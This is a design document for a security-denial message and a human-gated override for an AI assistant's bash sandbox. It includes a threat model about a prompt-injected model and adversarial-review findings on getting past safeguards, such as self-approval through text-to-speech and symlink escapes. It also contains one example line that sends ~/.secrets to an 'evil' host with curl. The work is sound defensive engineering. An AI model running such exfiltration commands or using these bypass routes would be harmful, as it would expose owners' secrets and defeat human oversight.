# Security-Denial Messaging + Human-Gated Override — Design (2026-07-07)

Owner-requested. When a security layer blocks a tool call, Fae must (1) tell the user
*why* in plain language, and (2) offer a **human-gated** 10-second authorize popup to
override, with allow-once / always-allow grants — **tiered** so raw-secret reads can
never be permanently unlocked. This design is the artifact the adversarial review
(codex + skeptics) attacks before implementation lands.

## Threat model (the invariant everything serves)
The whole reason the C1/C2 bash sandbox exists: a **prompt-injected local model** must
not be able to read `~/.secrets`/`~/.ssh`/identity files or exfiltrate the daemon env.
An override that the *model* can trigger destroys that. Therefore:

> **INVARIANT H (human-only):** an override is authorized ONLY by a human hardware
> click on the authorize card. The model's tool arguments never carry, imply, or
> influence the override decision. The override travels on a **separate channel**
> (Swift, post-click) that the model cannot write.

> **INVARIANT F (fail-closed):** absence, malformation, expiry, or any doubt about an
> override → full sandbox / full deny. No override = today's behavior exactly.

> **INVARIANT S (scoped):** a grant authorizes a **specific path or command pattern**,
> never "always allow bash" wholesale. One approval = one narrow capability.

## Part A — Clear denial messaging (low-risk, ships regardless)
Today a blocked bash surfaces as "✗ Failed: bash" (opaque). Introduce a typed
`SecurityDenial { reason, blockedLayer, target, tier, overridable }` carried on the
tool result when a security layer denies. The pipeline turns it into a spoken/printed
line: *"I can't read `~/.secrets` — it's a protected file I'm blocked from touching for
your security."* Layers that produce it:
- Swift `DamageControlPolicy` block (pre-routing).
- Daemon Host-bash **sandbox** denial (seatbelt "Operation not permitted" / non-zero
  exit on a protected read) — the daemon must tag the tool result so Swift can tell a
  *security* denial from an ordinary bash error (don't just string-match "Operation not
  permitted"; the daemon knows it applied a read-deny profile and the child hit it).
- `PathPolicy` / network-target denials.

## Part B — The tiers (owner-approved)
| Tier | Members | Override offered |
|------|---------|------------------|
| **General** | any non-protected path/command | Deny / **Allow once** / **Always allow** (persistent, scoped grant) |
| **Secrets (owner-owned)** | `~/.secrets`, `~/.env`, `~/.envrc`, `~/.ssh`, `~/.aws`, `~/.gnupg`, `~/.kube`, `~/.netrc`, … | Deny / **Allow once** / **Allow 5 min** — **NO permanent "always"** |
| **Fae-integrity (never)** | `~/.fae-vault(-dev)`, `speakers.json`, `directive.md`, `models.lock` | **Deny only — not overridable at all** (these are Fae's own trust anchors; even the owner shouldn't casually exfiltrate/alter them via a model-driven bash) |

The daemon **also** hard-enforces the "never" subset and refuses any override for it
(belt-and-suspenders — Swift never offers it, and the daemon never honors it).

## Part C — The override mechanism (the adversarial crux)
The block happens at two layers; the override must cover the one that actually executes.

**Chosen approach — daemon-side scoped override (single execution path):**
1. Model emits a `bash` call → Swift ToolExecutor → the relevant layer denies →
   `SecurityDenial` returned.
2. If `overridable`, Swift shows the **authorize card** (10 s, default = Deny on
   timeout). Buttons per tier (above). The card names the exact target
   (*"Fae wants to read `~/.secrets`"*) and command.
3. **Human clicks Allow** → Swift constructs an **override directive** for THIS call:
   `{ tool_call_id, target_path, grant: once|expiring|persistent, nonce }`, set ONLY by
   Swift here — never from the model's arguments — and re-submits the bash call to the
   daemon carrying it as a **separate top-level field** on the toolhost request (not
   inside the model-authored `command`/`input`).
4. The daemon, on a Host-bash call, builds the seatbelt read-deny profile **minus** the
   overridden `target_path` — scoped to exactly that path, for exactly that call. No
   override field → full deny (Invariant F). Override naming a "never" path → refuse
   (Part B). The daemon trusts the field because the socket is the authenticated owner
   surface (bootstrap-token socket) — the model cannot reach that socket directly, only
   via Swift, which only sets the field post-human-click.
5. **"Always"/"5-min" grants** live in a Swift-side grant store (`GrantStore`) in
   Fae's protected config dir (NOT a tool-writable path — DamageControl already
   zero-accesses `directive.md`/etc.; the grant store gets the same protection). A
   matching future call auto-constructs the per-call override *without* re-prompting —
   but the auto-construction still happens in Swift, still off the model channel, and
   secrets-tier grants are `once`/`expiring` only.

**Alternative considered (rejected for now, note for review):** route approved bash to
the Swift in-process `SafeBashExecutor` with a relaxed seatbelt, keeping the daemon
sandbox absolute. Cleaner isolation of the daemon, but diverges the execution path for
approved vs normal commands and doesn't work headless/Linux. Recorded so review can
challenge the choice.

## What the review must try to break
1. Can the **model** cause `overridable=true` or set the override field, directly or by
   crafting `command`/arguments? (Must be NO — separate channel, Swift-only.)
2. Can an override for path A read path B (scope escape via symlink, `..`, glob, `$VAR`,
   hardlink, or the daemon's profile-construction)? Canonicalize before removing from
   the deny set; the removed entry must be the canonical target only.
3. Can a "never" (Fae-integrity) path ever be overridden (Swift bug offers it; daemon
   bug honors it)? Both must refuse.
4. Can a persistent grant be set for a secrets-tier path (tier misclassification, or a
   path that matches multiple tiers)?
5. Does the grant store survive being pointed at a model-writable location, and can a
   tool write/alter grants? (Grant store must be in the protected set + integrity-checked.)
6. Timeout race: does a late human click after the 10 s expiry still authorize? (Must
   be NO — expiry is authoritative; the card resolves Deny and cannot be un-resolved.)
7. Does the env-scrub (C1) still hold for an approved read? (An override relaxes ONE
   read path; it must NOT re-add secrets to the child env — env scrub is independent of
   the read-deny profile.)
8. Concurrency: two overlapping approvals, or an approval that outlives the turn.

## v2 — LOCKED BINDING RULES (after adversarial review: codex gpt-5.5 xhigh + opus skeptic)
Both reviews: architecture (daemon-side scoped override) is correct; NONE of the 8
vectors were sound as first written. These are now hard requirements — implementation
must satisfy every one, and the impl review verifies them against real code.

**L1 — Truthful origin + interactive-only (skeptic F1, verified).** Today
`DaemonToolHostSession.execute` sends `{tool,input}` with NO origin →
`parse_tool_origin(None)` → OwnerInteractive → Host, so the daemon can't distinguish an
interactive turn from an injected proactive/script one. FIX: Swift sends a truthful
per-turn `origin`; the daemon **refuses any override unless origin == owner_interactive**.
(Also fixes the standalone gap #38: autonomous Swift turns should map to Jailed.)

**L2 — Hardware-click-only channel (codex Vector A, CRITICAL).** A NEW dedicated
`securityOverride.approve` signal wired ONLY to the authorize-card button. The override
directive is minted ONLY in that button handler. It MUST NOT reuse ANY legacy approval
path — not `VoiceCommandParser`/voice "yes", not TestServer `/approve`, not
`respondToApproval()` — because a model can emit speech via the `say`/TTS tool and
self-approve through voice recognition. Legacy approval routes are explicitly excluded
from minting override directives.

**L3 — Daemon owns tiers + enforcement (skeptic F2/F5, codex Vector C/D).** ONE
authoritative daemon tier table (single source of truth; Swift's is advisory UX only).
Precedence **Fae-Integrity > Secrets > General; strictest wins on multi-match.** Daemon
validates the tier of the canonical target in `ToolHostRequest` evaluation **before**
building the seatbelt profile. Fae-Integrity set (never overridable, hard-rejected by the
daemon even if a directive names it): `~/.fae-vault(-dev)`, `speakers.json`,
`directive.md`, `models.lock`, **and the grant-store file**. Add `models.lock` +
grant-store to the daemon's protected/never set (they're missing today).

**L4 — Canonicalize + file-granular (codex Vector B, skeptic F6).** Daemon
`realpath()`-canonicalizes `target_path` before removing it from the deny-set; removes
ONLY that exact canonical **file** leaf, never a directory prefix; rejects directory-
granular unlocks and any target whose canonical form lands under a never-path. A
workspace symlink→secret stays blocked (deny matches the canonical secret path).

**L5 — Network-deny on any Secrets-tier unlock (skeptic F3, highest-leverage).** The Host
seatbelt is `(allow default)` incl. network, so one allow-once on a secret enables
`cat ~/.secrets | curl -d @- evil` in a single call. When an override unlocks a
Secrets-tier read, the daemon's profile for THAT call also **denies `network*`** (and
non-workspace/tmp writes). The card shows the FULL, unelided command.

**L6 — Absolute expiry + one-shot resolve (codex Vector F, skeptic F7).** The directive
carries `expiry_ms` (UNIX epoch) set by Swift at click-time; daemon honors only
`now_ms() <= expiry_ms` (boundary inclusive). The card is a one-shot like
`ToolHostOperationWaiter`: 10 s expiry resolves Deny and disarms the click handler,
resolved exactly once; a late click after expiry does nothing.

**L7 — Per-call single-use binding (codex Vector H, skeptic F9).** Override keyed
strictly `Map<call_id, directive>`; the daemon rejects a directive whose `call_id` ≠ the
in-flight call; the entry is deleted after the call completes (success or error). No
reuse across calls even if `target_path` matches. `call_id` is daemon-minted /
non-reusable.

**L8 — Grant-store integrity (codex Vector E, skeptic F8).** Hard-coded path
`~/Library/Application Support/fae/grant-store.json`; DamageControl zero-access block on
`~/Library/Application Support/fae/grant*`; daemon never-set includes it; `chmod 0600` on
write; on load, reject if it is a symlink / `realpath` ≠ expected; integrity-check
contents. Grants NEVER live under a daemon-approved workspace root.

**L9 — Grant auto-apply only on interactive turns (skeptic F4).** A stored grant
auto-mints a per-call override ONLY on a genuinely interactive owner turn (needs L1),
never on a proactive/script/injected turn within the window; re-check tier + canonical
path at apply time; Secrets 5-min grants require the human still present, not just an
unexpired timer.

**L10 — Env-scrub independence (codex Vector G).** The override relaxes ONLY the
read-deny seatbelt profile; it NEVER touches env scrubbing. Every daemon child spawn
calls `scrubbed_child_env()` unconditionally — no override fast-path skips it. Impl
review audits this.

**L11 — Socket reachability test (skeptic).** Add a test proving `toolhost.execute`
(hence override directives) is UNREACHABLE from the diagnostic TCP/WS surface — only the
bootstrap-token Unix socket the Swift app holds. Document socket-auth as the load-bearing
trust boundary.

Build order under v2: Part A (messaging) first; then L1 (origin) as its own gated change
(also closes #38); then the daemon override primitives (L3/L4/L5/L6/L7/L10) fail-closed +
tested; then the Swift hardware-only card + grant store (L2/L8/L9). Impl-level codex +
skeptic review before fold.

## Rollout
- Part A (messaging) lands first — low risk, immediately better UX.
- Part B/C behind the same fail-closed defaults; the daemon override path is gated so
  that with no Swift override field, behavior is byte-identical to today.
- Owner live-check: a denied `cat ~/.secrets` shows the "for security reasons" line +
  the card; Allow-once lets that one read through and nothing else; the card times out
  to Deny; a "never" path shows no Allow button.
